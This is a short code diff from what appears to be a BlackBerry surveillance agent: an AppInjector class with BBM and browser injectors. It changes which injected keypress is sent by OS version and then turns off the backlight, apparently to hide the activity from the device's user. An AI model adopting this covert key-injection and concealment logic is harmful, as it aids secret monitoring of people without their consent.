@@ -9,14 +9,13 @@
 
 package blackberry.injection;
 
-import net.rim.device.api.memorycleaner.MemoryCleanerDaemon;
 import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.ApplicationManager;
 import net.rim.device.api.system.Backlight;
-import net.rim.device.api.system.SerialPort;
 import net.rim.device.api.ui.Keypad;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
+import blackberry.Device;
 import blackberry.agent.im.AppInjectorBBM;
 import blackberry.agent.url.AppInjectorBrowser;
 import blackberry.debug.Debug;
@@ -120,7 +119,14 @@ public class AppInjector {
         }
         
         Utils.sleep(delegate.getDelay());
-        KeyInjector.pressRawKeyCode(Keypad.KEY_SPEAKERPHONE);
+        if(Device.getInstance().atLeast(4,7)){
+            // con 9700 :
+            KeyInjector.pressRawKeyCode(Keypad.KEY_LOCK);
+        }else{
+            // con 9300 funziona:
+            KeyInjector.pressRawKeyCode(Keypad.KEY_SPEAKERPHONE);
+        }
+        
         Utils.sleep(500);
         Backlight.enable(false);
         Utils.sleep(delegate.getDelay());
